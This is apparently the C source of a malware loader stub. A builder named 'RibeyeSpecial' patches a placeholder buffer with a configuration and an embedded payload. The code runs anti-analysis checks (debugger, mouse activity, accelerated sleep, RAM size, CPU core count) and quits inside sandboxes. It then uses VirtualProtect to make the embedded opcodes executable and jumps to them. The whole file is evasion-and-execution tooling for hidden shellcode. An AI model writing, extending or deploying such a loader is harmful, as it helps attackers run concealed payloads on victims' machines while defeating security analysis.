#include <Windows.h>
#include <stdio.h>
#include "Anti.h"

// Data that will be replaced by RibeyeSpecial, prepare 20bytes for now but will grow
const char rawData[2097152] = { 'C', 'O', 'C', 'O', 'N', 'U', 'T', 'Z' };

// Struct that will determine the configuration to run this
struct Coconut
{
	int AES_Key = 0;
	bool sleep = false;
	int sleepTime = 5000;
	bool prime = false;
	bool mouse = false;
	bool acceleratedsleep = false;
	bool debugger = false;
	bool ram = false;
	bool cpu_core = true;
	int szData = 0;
	const char * opcodes = 0;
};


int main()
{
	Coconut settings = *(Coconut*)rawData;


	printf("%d %d %d %d %d %d %d %d | %d %d %d %d %d\n", settings.sleep, settings.sleepTime, settings.prime, settings.mouse, settings.acceleratedsleep, settings.debugger, settings.ram, settings.cpu_core, (BYTE)settings.opcodes, (BYTE)settings.opcodes + 1, (BYTE)settings.opcodes + 2, (BYTE)settings.opcodes + 3 );

	if (settings.prime) 
	{ 
		prime();
	}
	if (settings.sleep)
	{
		ntSleep(settings.sleepTime);
	}
	if (settings.mouse)
	{
		if (chk_mouse())
			return 1;
	}
	if (settings.acceleratedsleep)
	{
		if (chk_acceleratedsleep())
			return 1;
	}
	if (settings.debugger)
	{
		if (chk_dbg())
			return 1;
	}
	if (settings.ram) 
	{
		if (chk_ram())
			return 1;
	}
	if (settings.cpu_core)
	{
		if (chk_cores())
			return 1;
	}

	DWORD old;
	if (VirtualProtect((LPVOID)settings.opcodes, settings.szData, PAGE_EXECUTE, &old)) {

		int(*foo)() = (int(*)())(LPVOID)settings.opcodes;
		DWORD foo_value = foo();

	}

	return 0;
}